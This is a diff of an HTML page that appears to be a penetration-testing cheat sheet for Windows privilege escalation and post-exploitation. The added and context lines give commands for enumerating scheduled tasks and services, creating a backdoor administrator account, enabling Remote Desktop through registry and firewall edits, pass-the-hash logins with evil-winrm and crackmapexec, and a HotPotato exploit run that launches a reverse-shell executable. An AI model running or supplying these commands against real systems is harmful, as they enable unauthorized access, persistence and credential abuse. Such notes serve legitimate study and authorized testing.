@@ -696,7 +696,10 @@ net localgroup &lt;group?&gt;</code></pre><p id="defb30b1-24fc-4959-8c5b-e7142fe
 sc queryex type= service</code></pre><p id="2e2c8800-2601-4d1b-8fc9-2601c1631691" class="">Firewall settings:</p><pre id="b32efded-9d9b-4757-aed3-e459b38c720e" class="code"><code>netsh advfirewall firewall dump
 netsh firewall show state
 netsh firewall show config</code></pre><p id="93de35ca-3035-4dd4-8e6c-f9de104e75f6" class="">
-</p><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class=""><strong>Add user:</strong></p><pre id="a82198ea-45a7-49ff-b5bb-11ad3eb11e40" class="code"><code>net user test password123! /add
+</p><p id="4a4bfafd-e5a9-47a3-bec7-906a1a44f862" class=""><strong>Scheduled Tasks:</strong></p><pre id="12e115d8-6a35-4441-9d8f-a5e6e150a402" class="code"><code>schtasks /query /fo LIST /v
+PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class="">
+</p><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
+</p><p id="436378b6-ed64-449c-a14d-4abca7341669" class=""><strong>Add user:</strong></p><pre id="a82198ea-45a7-49ff-b5bb-11ad3eb11e40" class="code"><code>net user test password123! /add
 net localgroup Administrators test /add
 net localgroup &quot;Remote Desktop Users&quot; test /add
 reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -704,10 +707,14 @@ rdesktop 0.0.0.0 -u test -p password123!</code></pre><p id="61275796-528c-46d2-a
 </p><p id="1996e6d3-9066-4af2-84b4-2894e8a771bd" class=""><strong>Find writable directories</strong></p><pre id="de998531-11ad-4f26-9045-4f5a935fa3cb" class="code"><code>find / -type d -writable -print
 find -type f -maxdepth 1 -writable</code></pre><p id="07752bc6-a641-437b-8c75-bd5ffc00aab2" class="">
 </p><p id="f6e25951-13ad-4b23-9487-cdf801b8e394" class="">Check app data for powershell history, clear text credentials</p><p id="d6e09ed3-3045-43e7-92ba-b19fa215d8b0" class="">Check recycle bins, saved browser passwords, saved program passwords.</p><p id="080dba3d-0a40-4445-bad5-c4399dbb2ac7" class="">
-</p><p id="86f8489f-f7ac-451d-875d-c72e2238d843" class=""><strong>Evil Winrm:</strong></p><pre id="90e3c2a9-00f7-431a-91b9-fdba506f5652" class="code"><code>evil-winrm -i 0.0.0.0 -u pwn -p &#x27;Password1!&#x27;</code></pre><p id="6c99333a-7bd3-4c18-b089-67a762d7ff16" class="">
+</p><p id="86f8489f-f7ac-451d-875d-c72e2238d843" class=""><strong>Evil Winrm:</strong></p><pre id="90e3c2a9-00f7-431a-91b9-fdba506f5652" class="code"><code>evil-winrm -i 0.0.0.0 -u pwn -p &#x27;Password1!&#x27;
+evil-winrm -i 0.0.0.0 -u pwn -H &lt;Hash&gt;
+crackmapexec winrm -u pwn -H &lt;Hash&gt;</code></pre><p id="6c99333a-7bd3-4c18-b089-67a762d7ff16" class="">
 </p><p id="15adbf57-025e-4eb2-bd07-04d95bf3692e" class=""><strong>Enabling remote desktop:</strong></p><p id="0c0b8241-bbc5-4715-9719-996a6d698985" class=""><a href="https://www.thewindowsclub.com/enable-remote-desktop-using-command-line">https://www.thewindowsclub.com/enable-remote-desktop-using-command-line</a></p><pre id="d00e005d-f267-46db-98f3-6829ee926d79" class="code"><code>#Command Line
 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes
 #Powershell
 Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;-name &quot;fDenyTSConnections&quot; -Value 0
-Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre></div></article></body></html>
+Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre><p id="89aada47-ed9b-48f6-96df-a334d0894fa0" class="">
+</p><pre id="2cc5e0e4-afd8-414c-9915-215ea92942ad" class="code"><code>Start-Process -NoNewWindow -FilePath C:/File.exe</code></pre><p id="aa441897-7bd0-4fbf-907d-20178cf46e7b" class="">
+</p><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class="">HotPotato:</p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>.\potato.exe -ip 0.0.0.0 -cmd &quot;C:\reverse.exe&quot; -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true</code></pre></div></article></body></html>
